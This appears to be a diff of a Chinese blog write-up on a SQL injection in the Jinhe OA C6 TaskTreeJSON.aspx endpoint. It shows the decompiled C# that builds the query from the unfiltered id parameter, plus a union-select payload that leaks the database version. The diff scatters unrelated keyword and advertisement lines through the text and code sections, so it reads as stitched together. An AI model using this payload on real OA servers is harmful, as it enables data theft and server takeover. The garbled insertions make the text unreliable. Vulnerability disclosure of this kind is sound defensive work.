@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `TaskTreeJSON.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
 
-SQL注入防护
+编程
 
 # 影响版本
 
@@ -22,21 +22,21 @@ SQL注入防护
 
 先看下
 
+深入探索
+
+移动安全防护软件
+
+Web应用防火墙
+
+加密U盘
+
 ```
 <%@ Page Language="C#" AutoEventWireup="true" CodeBehind="TaskTreeJSON.aspx.cs" Inherits="JHSoft.Web.DailyTaskManage.TaskTreeJSON" %>
 ```
 
 在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `TaskTreeJSON` 的处理逻辑
 
-代码安全审计
-
-深入探索
-
-云安全解决方案
-
-Docker加速服务
-
-防火墙软件
+漏洞扫描服务
 
 ```
 protected void Page_Load(object sender, EventArgs e)
@@ -51,6 +51,14 @@ protected void InitTaskTree(string strParentID)
 {
   DataTable dataTable = this.dbOperator.ExecSQLReDataTable($"{$" select a.TaskID,a.TaskNumber,a.TaskName,b.UserName as SendName,c.UserName as ExecName,a.TaskProgress,a.TaskFinishFlag,case when exists(select TaskID from TaskManage where TaskFatherID = a.TaskID and TaskIsDel = 0 and TaskFinishFlag = 0) then 1 else 0 end as HasChild,a.TaskRootScale from TaskManage a inner join Users b on a.TaskSendPersonID = b.UserID left join Users c on a.TaskExecutorID = c.UserID where TaskFatherID = '{strParentID}' "} and a.TaskNumber in ( select distinct substring(TaskNumber,0,50) as TaskNumber from TaskManage where (TaskSendPersonID = '{this.strUser}' or (','+TaskExecutorID+',' like '%,{this.strUser},%' or ','+TaskOthersID+',' like '%,{this.strUser},%') or ','+TaskViewRegCode+',' like '%,{this.strUser},%') and TaskFinishFlag <> 2 and TaskIsDel = 0 ) " + " and a.TaskFinishFlag = 0 and a.TaskIsDel = 0 ");
 ```
+
+深入探索
+
+安全硬件设备
+
+安全运维服务
+
+漏洞利用手册
 
 参数 `id` 被直接拼接进 `ExecSQLReDataTable` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。
 
@@ -68,4 +76,4 @@ id='/**/UniOn/**/all/**/SelECt/**/NULL,@@verSion,NULL,NULL,NULL,NULL,NULL,NULL,N
 
 通过联合注入，成功在响应回显数据库版本信息
 
-漏洞修复方案
+数据管理
